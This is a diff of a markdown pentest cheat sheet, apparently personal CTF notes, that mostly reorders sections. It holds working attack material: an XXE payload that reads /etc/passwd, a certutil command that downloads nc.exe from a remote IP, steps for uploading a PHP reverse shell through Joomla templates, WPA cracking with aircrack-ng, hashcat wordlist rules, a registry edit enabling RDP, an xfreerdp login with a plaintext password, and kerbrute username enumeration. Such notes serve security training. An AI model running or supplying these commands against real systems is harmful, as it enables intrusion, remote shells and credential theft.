@@ -165,6 +165,34 @@ chmod +s /bin/bash
 > 1. To execute a PHP script file, in command line simply type -> php <file name.php>
 > 1. to start a php based webserver, simply type -> php -S localhost:8000
   
+##### XXE injection
+```bash
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>&xxe;</cwe>
+		<cvss>&xxe;</cvss>
+		<reward>&xxe;</reward>
+		</bugreport> 
+```
+
+#### Scripts & Utilities
+> 1. Extract IP addresses out a file - sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}
+
+#### Hashcat Generate Custom Wordlist
+> 1. hashcat --force words -r /usr/share/hashcat/rules/append_specialchars.rule -r /usr/share/hashcat/rules/best64.rule --stdout > hashcardDict.txt
+> 1. /usr/share/hashcat/rules/append_specialchars.rule ---> has special characters specified e.g. ! @ # *
+
+#### Linux tips
+> 1. convert next line to white space `cat file.txt | tr '\r\n' ' '`
+> 1. delete white spaces from a file `cat file.txt | tr -d ' '`
+> 1. print only 1st field before ":" `cut -d ":" -f1  myfile.txt.2 > usernames`
+> 1. covert all from Uppercase to Lowercase ```echo "$a" | tr '[:upper:]' '[:lower:]'```
+  
+#### Cracking passwords from .pcap file
+> 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
+	
 #### Windws Tricks
 ##### Download a file in Windows via certutil
 > 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe
@@ -213,18 +241,10 @@ chmod +s /bin/bash
 > 1. enable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 > 1. disable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 
-##### XXE injection
-```bash
-<?xml  version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
-		<bugreport>
-		<title>&xxe;</title>
-		<cwe>&xxe;</cwe>
-		<cvss>&xxe;</cvss>
-		<reward>&xxe;</reward>
-		</bugreport> 
-```
-  
+
+#### Joomla Reverse Shell
+> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
+> 1. https://vk9-sec.com/reverse-shell-on-any-cms/
   
 ##### Access Windows box via xfreerdp
 > 1. xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389
@@ -242,26 +262,6 @@ chmod +s /bin/bash
 > 1. netsh advfirewall firewall add rule name=”Open Port 2222 for WSL2” dir=in action=allow protocol=TCP localport=2222 [ firewall]
 > 1. netsh interface portproxy show v4tov4 [ to show the entries added]
 > 1. netsh int portproxy reset all [ reset everything ]
-
-#### Scripts & Utilities
-> 1. Extract IP addresses out a file - sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}
-
-#### Hashcat Generate Custom Wordlist
-> 1. hashcat --force words -r /usr/share/hashcat/rules/append_specialchars.rule -r /usr/share/hashcat/rules/best64.rule --stdout > hashcardDict.txt
-> 1. /usr/share/hashcat/rules/append_specialchars.rule ---> has special characters specified e.g. ! @ # *
-
-#### Linux tips
-> 1. convert next line to white space `cat file.txt | tr '\r\n' ' '`
-> 1. delete white spaces from a file `cat file.txt | tr -d ' '`
-> 1. print only 1st field before ":" `cut -d ":" -f1  myfile.txt.2 > usernames`
-> 1. covert all from Uppercase to Lowercase ```echo "$a" | tr '[:upper:]' '[:lower:]'```
-  
-#### Cracking passwords from .pcap file
-> 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
-
-#### Joomla Reverse Shell
-> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
-> 1. https://vk9-sec.com/reverse-shell-on-any-cms/
 
 #### Active Directory 
 > 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
